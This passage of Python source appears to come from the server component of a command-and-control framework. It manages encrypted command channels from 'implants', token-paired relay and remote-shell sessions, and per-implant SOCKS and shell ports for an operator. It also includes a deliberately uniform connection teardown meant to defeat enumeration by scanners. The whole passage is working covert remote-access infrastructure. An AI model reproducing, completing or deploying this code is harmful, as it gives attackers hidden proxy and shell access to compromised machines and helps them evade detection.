                logger.info("tunnel: %r asked to close its command channel",
                            channel.identity)
                return
            else:
                # HELLO, RELAY, SHELL, OPEN_RELAY and OPEN_SHELL all mean the
                # far end has lost track of which direction it is talking in.
                logger.debug("tunnel: %r sent %s on an established channel",
                             channel.identity,
                             MESSAGE_KIND_NAMES.get(kind, kind))
                return

    def _retire(self, sessions: List[RelaySession]) -> None:
        """Fold finished sessions' byte counts into their identity's total.

        Called with the lock held, and exactly once per session: the
        session has to have been taken out of `_sessions` in the same
        critical section, or two callers could count it twice.
        """
        for session in sessions:
            stream = session.sock
            if stream is None:
                continue
            total = self._traffic.setdefault(session.identity, [0, 0])
            total[0] += stream.bytes_in
            total[1] += stream.bytes_out

    def _forget(self, channel: _CommandChannel) -> None:
        """Drop a channel and every session that belonged to it."""
        with self._lock:
            if self._channels.get(channel.identity) is channel:
                del self._channels[channel.identity]
            mine = [session for session in self._sessions
                    if session.identity == channel.identity]
            self._sessions = [session for session in self._sessions
                              if session not in mine]
        channel.close()
        # The endpoint that owned the command channel owned its relays too,
        # so a session outliving it could never pair or carry anything.
        for session in mine:
            session.close()
        # After closing, so the totals are final: nothing can add a byte to
        # a stream that is shut down.
        with self._lock:
            self._retire(mine)

    # ── the relay channel ──

    def _serve_relay(self, conn: socket.socket, peer: str,
                     noise: NoiseSession, identity: str, body: dict) -> bool:
        return self._serve_claimed(conn, peer, noise, identity, body, "relay")

    def _serve_shell(self, conn: socket.socket, peer: str,
                     noise: NoiseSession, identity: str, body: dict) -> bool:
        return self._serve_claimed(conn, peer, noise, identity, body, "shell")

    def _serve_claimed(self, conn: socket.socket, peer: str,
                       noise: NoiseSession, identity: str, body: dict,
                       kind: str) -> bool:
        """Claim the session this token opened, answer, and pair it.

        What a relay and a shell share: both arrive as a second connection
        carrying a one-time token, and both end as a `RelayStream` the
        operator side reads. `kind` is the kind the first payload said it
        was, and the token has to have been minted for that kind.
        """
        self._authenticated(conn)
        token = _token_bytes(body.get("token"), kind)
        session = self._claim(token, identity, peer, kind)
        if session is None:
            return False
        try:
            write_frame(conn, noise.reply())
        except (OSError, ValueError) as exc:
            # The session is already out of the pending pool, so it cannot
            # be paired by a later connection; the operator's `wait_paired`
            # returns False rather than waiting for something that will
            # never arrive.
            session._expire("closed")
            logger.debug("tunnel: could not finish the handshake with %s: %s",
                         peer, exc)
            return False
        # The consumer owns the timeout from here: how long to wait on a
        # relayed byte is its policy, not this loop's.
        conn.settimeout(None)
        stream = RelayStream(conn, noise, peer, on_close=session._stream_closed)
        session._pair(stream)
        logger.info("tunnel: %s paired %s session %d for %r",
                    peer, kind, session.number, identity)
        return True

    def _claim(self, token: bytes, identity: str, peer: str,
               kind: str) -> Optional[RelaySession]:
        """The pending session this token belongs to, or None.

        Compared with `compare_digest` against every pending session, and
        the state moves out of `pending` the moment one matches, so a
        token cannot pair twice. A match has to be the right identity *and*
        the right kind: a refused claim leaves the session pending, so a
        wrong guess by a build that holds a valid token cannot cost the
        operator the session it was minted for.
        """
        with self._lock:
            for session in self._sessions:
                if session.state != "pending":
                    continue
                if not hmac.compare_digest(session.token, token):
                    continue
                if session.identity != identity:
                    logger.warning(
                        "tunnel: %s authenticated as %r and presented the "
                        "%s token of %r; refused", peer, identity, kind,
                        session.identity)
                    return None
                if session.kind != kind:
                    logger.warning(
                        "tunnel: %s authenticated as %r and presented a "
                        "%s claim with the token of a %s session; refused",
                        peer, identity, kind, session.kind)
                    return None
                session._claim()
                return session
        logger.info("tunnel: %s presented a %s token matching no open "
                    "session", peer, kind)
        return None

    # ── keep-alive and expiry ──

    def _housekeeping_loop(self) -> None:
        tick = min(self.keepalive_interval, self.session_timeout,
                   self.handshake_timeout)
        tick = max(_TICK_FLOOR, min(_TICK_CEILING, tick / 2.0))
        while not self._stopping.wait(tick):
            now = time.time()
            with self._lock:
                channels = [channel for channel in self._channels.values()
                            if channel.ready]
                # A peer that sends a byte just often enough to keep the
                # socket's own timeout from firing would otherwise hold a
                # thread for as long as it liked: `read_frame`'s timeout is
                # per-recv, so the absolute bound has to come from here.
                stalled = [conn for conn, arrived in self._live.items()
                           if now - arrived >= self.handshake_timeout]
                for conn in stalled:
                    del self._live[conn]
            for conn in stalled:
                logger.debug("tunnel: a connection failed to authenticate "
                             "within %.1fs; dropping it",
                             self.handshake_timeout)
                _shut(conn)
            for channel in channels:
                if now - channel.last_ping < self.keepalive_interval:
                    continue
                channel.last_ping = now
                try:
                    channel.send(MSG_PING, {})
                except (OSError, ValueError) as exc:
                    # The reader thread owns the table entry; closing the
                    # socket is what tells it to let go.
                    logger.debug("tunnel: keep-alive to %r failed: %s",
                                 channel.identity, exc)
                    channel.close()
            with self._lock:
                # The deadline check and the write that acts on it are one
                # critical section, under the same lock `_claim` takes.
                # Split, a relay arriving in between is claimed and paired
                # and then overwritten as expired: the operator is told the
                # pairing failed while a live, spliced connection sits in
                # no table at all. The log line is deliberately outside, so
                # nothing slow runs between the two.
                expired = [session for session in self._sessions
                           if session.state == "pending"
                           and now - session.created >= self.session_timeout]
                for session in expired:
                    session._expire("expired")
                keep, finished = [], []
                for session in self._sessions:
                    if session.state in ("pending", "claimed", "paired"):
                        keep.append(session)
                    else:
                        finished.append(session)
                self._sessions = keep
                self._retire(finished)
            for session in expired:
                logger.info("tunnel: relay session %d for %r was never "
                            "claimed in %.1fs; expiring it",
                            session.number, session.identity,
                            self.session_timeout)

    # ── the port table ──

    def _assign_port(self, identity: str) -> int:
        """This identity's SOCKS port, assigning and persisting one if new.

        Called with the lock held. An identity already in the table keeps
        its port even if the configured range has since moved, because a
        port that moves under an operator is this design's own anti-goal.
        """
        port = self._ports.get(identity)
        if port is not None:
            return port
        taken = set(self._ports.values()) | set(self._shell_ports.values())
        for candidate in range(self.first_port, self.last_port + 1):
            if candidate in taken:
                continue
            self._ports[identity] = candidate
            try:
                self._write_state()
            except OSError:
                del self._ports[identity]
                raise
            return candidate
        raise ValueError(
            "every port in %d-%d is already taken by another identity's "
            "SOCKS or shell port; widen port_range or retire a build"
            % (self.first_port, self.last_port))

    def _assign_shell_port(self, identity: str) -> Optional[int]:
        """This identity's shell port, assigning and persisting one if new.

        Called with the lock held, and it shares `_assign_port`'s rule that
        an identity already in the table keeps its port even if the
        configured range has since moved.

        It differs in one way, and the difference is the point: this
        **returns `None` instead of raising**. `_assign_port` is called
        while an endpoint registers, and a `ValueError` there refuses the
        whole registration, which is right for a SOCKS port -- without one
        there is no tunnel. A shell port is a feature riding on a tunnel
        that already works, so no range configured, none left, or a state
        file that would not write must cost that identity its shell and
        nothing else: not its registration, not its SOCKS port, not its
        traffic. The reason is kept for `endpoints()` to report as
        `shell_detail`.
        """
        port = self._shell_ports.get(identity)
        if port is not None:
            return port
        if self.shell_first_port is None:
            self._shell_why.pop(identity, None)
            return None
        taken = set(self._ports.values()) | set(self._shell_ports.values())
        for candidate in range(self.shell_first_port, self.shell_last_port + 1):
            if candidate in taken:
                continue
            self._shell_ports[identity] = candidate
            try:
                self._write_state()
            except OSError as exc:
                del self._shell_ports[identity]
                self._shell_why[identity] = (
                    "the shell port could not be recorded in %s: %s"
                    % (self.state_path, exc))
                logger.warning("tunnel: no shell port for %r: %s",
                               identity, self._shell_why[identity])
                return None
            self._shell_why.pop(identity, None)
            return candidate
        self._shell_why[identity] = (
            "every port in %d-%d is already taken by another identity's "
            "SOCKS or shell port; widen shell_port_range or retire a build"
            % (self.shell_first_port, self.shell_last_port))
        logger.warning("tunnel: no shell port for %r: %s",
                       identity, self._shell_why[identity])
        return None

    def _shell_detail(self, identity: str) -> str:
        """Why this identity has no shell port. Called with the lock held."""
        if self.shell_first_port is None:
            return ("no shell_port_range is configured, so no shell port is "
                    "assigned")
        return self._shell_why.get(
            identity, "no shell port assigned yet; one is assigned when the "
                      "endpoint next registers")

    def _state_error(self, field: str, reason: str) -> ValueError:
        return ValueError("%s: %s: %s" % (self.state_path, field, reason))

    def _load_state(self) -> None:
        """Read the port table, or start with an empty one.

        A malformed table is an error when it is read, naming the file and
        the field, following `keys.py` and `listeners/registry.py`: a
        damaged table means somebody's SOCKS port is about to move, and
        guessing which is worse than refusing to start.
        """
        try:
            with open(self.state_path, "r", encoding="utf-8") as handle:
                text = handle.read()
        except FileNotFoundError:
            self._ports = {}
            self._shell_ports = {}
            return
        try:
            document = json.loads(text)
        except ValueError as exc:
            raise self._state_error("(file)", "is not valid JSON: %s" % exc)
        if not isinstance(document, dict):
            raise self._state_error("(file)", "expected a JSON object")
        ports = document.get("ports")
        if not isinstance(ports, dict):
            raise self._state_error("ports", "expected an object")
        table = self._read_table("ports", ports, {})
        # A version 1 document predates the shell table and has no such key.
        # That file is on disk at the moment of an upgrade, so it is an
        # empty table and not an error -- refusing it would take a working
        # deployment down for a feature it has not used yet.
        shells = document.get("shell_ports", {})
        if not isinstance(shells, dict):
            raise self._state_error("shell_ports", "expected an object")
        shell_table = self._read_table("shell_ports", shells, table)
        self._ports = table
        self._shell_ports = shell_table

    def _read_table(self, name: str, entries: dict,
                    other: Dict[str, int]) -> Dict[str, int]:
        """Validate one identity-to-port table of the state document.

        `other` is the table already read whose ports this one must not
        share: a port is one listener, whichever table it came from.
        """
        table = {}                  # type: Dict[str, int]
        for identity in sorted(entries):
            where = "%s[%r]" % (name, identity)
            port = entries[identity]
            if not identity:
                raise self._state_error(name, "has an empty identity")
            if isinstance(port, bool) or not isinstance(port, int):
                raise self._state_error(where, "expected an integer port")
            if not 1 <= port <= 65535:
                raise self._state_error(where, "%d is not a port" % port)
            for earlier, assigned in table.items():
                if assigned == port:
                    raise self._state_error(
                        where, "port %d is also assigned to %r"
                        % (port, earlier))
            for earlier, assigned in other.items():
                if assigned == port:
                    raise self._state_error(
                        where, "port %d is also the SOCKS port of %r"
                        % (port, earlier))
            table[identity] = port
        return table

    def _write_state(self) -> None:
        """Replace the port tables atomically, 0600.

        A reader -- a restarting server, a panel -- sees the old tables or
        the new ones and never half of either, which is the same rule
        `keys.py` follows for the key store.
        """
        document = {"version": _STATE_VERSION, "ports": dict(self._ports),
                    "shell_ports": dict(self._shell_ports)}
        data = (json.dumps(document, indent=2, sort_keys=True) + "\n").encode()
        directory = os.path.dirname(self.state_path)
        if directory:
            os.makedirs(directory, mode=_DIR_MODE, exist_ok=True)
        scratch = "%s.%s.tmp" % (self.state_path, os.urandom(6).hex())
        descriptor = os.open(scratch, os.O_WRONLY | os.O_CREAT | os.O_EXCL,
                             _FILE_MODE)
        try:
            with os.fdopen(descriptor, "wb") as handle:
                handle.write(data)
                handle.flush()
                os.fsync(handle.fileno())
            os.replace(scratch, self.state_path)
        finally:
            try:
                os.unlink(scratch)
            except FileNotFoundError:
                pass

    # ── helpers ──

    def _agent_for(self, implant_id: Optional[str]) -> Optional[str]:
        if implant_id is None or self._agent_lookup is None:
            return None
        try:
            agent = self._agent_lookup(implant_id)
        except Exception as exc:
            # Somebody else's table. A panel read must not raise because
            # the fleet's own lookup had a bad day; unlinked is the honest
            # answer and the row still appears.
            logger.debug("tunnel: agent lookup for %s failed: %s",
                         implant_id, exc)
            return None
        return agent if isinstance(agent, str) and agent else None


def _waiting_bytes(sock: socket.socket) -> bool:
    """True if a byte is waiting; False on an orderly close.

    `read_frame` reports a clean EOF between frames and a peer that
    vanished mid-frame with the same `ValueError`, so the difference is
    only in the message text. One `MSG_PEEK` moves it into the socket API
    instead: `b""` is a FIN with nothing behind it, a `socket.timeout`
    propagates as a stalled peer, and anything else means there are bytes
    in hand -- so a `ValueError` from the `read_frame` that follows is a
    malformed frame and cannot be an orderly teardown.
    """
    return bool(sock.recv(1, socket.MSG_PEEK))


def _shut(sock: socket.socket) -> None:
    """Close a socket without a reply and without raising.

    No error frame, no `CLOSE` message, no distinguishable sequence:
    everything this server does with a connection it does not want is
    identical, so there is nothing in the teardown for an enumerator to
    match either.

    The `shutdown` is for this side, not the wire. A peer's own thread can
    be sitting in `recv` on this descriptor -- the keep-alive closes a
    channel its reader is blocked on -- and on some platforms a bare
    `close` does not wake it, which would make `stop` wait out an idle
    timeout it promised to pre-empt. A FIN is what an ordinary close sends
    anyway, and no application byte goes out either way.
    """
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def _port_range(value) -> Tuple[int, int]:
    try:
        first, last = value
    except (TypeError, ValueError):
        raise ValueError(
            "port_range is (first, last) inclusive, got %r" % (value,))
    first, last = int(first), int(last)
    if not 1 <= first <= last <= 65535:
        raise ValueError(
            "port_range %d-%d is not an ascending range of ports"
            % (first, last))
    return first, last


def _text(value) -> Optional[str]:
    """A display string from a message body, or None.

    Anything that is not a non-empty string becomes None: these fields go
    on an operator's screen, and a `HELLO` is written by whatever is at
    the other end of the tunnel.
    """
    if isinstance(value, str) and value:
        return value
    return None


def _features(value) -> Tuple[str, ...]:
    """The strings of a `HELLO`'s `features` list, `()` for anything else.

    An absent key is the endpoint that predates features, and a value of
    the wrong shape is read the same way: it advertised nothing usable.
    """
    if not isinstance(value, list):
        return ()
    return tuple(item for item in value if isinstance(item, str))


def _token_bytes(value, kind: str) -> bytes:
    """The 32 bytes a `RELAY` or `SHELL` message's hex token stands for.

    `kind` is `"relay"` or `"shell"`: both arrive through this one path,
    so a refusal has to name the kind it was actually given rather than
    always say `RELAY`.
    """
    if not isinstance(value, str):
        raise ValueError("a %s message carries its token as a hex string"
                         % kind.upper())
    try:
        token = bytes.fromhex(value)
    except ValueError:
        raise ValueError("a %s token must be hex" % kind.upper())
    if len(token) != TOKEN_LEN:
        raise ValueError("a %s token is %d bytes, got %d"
                         % (kind.upper(), TOKEN_LEN, len(token)))
    return token
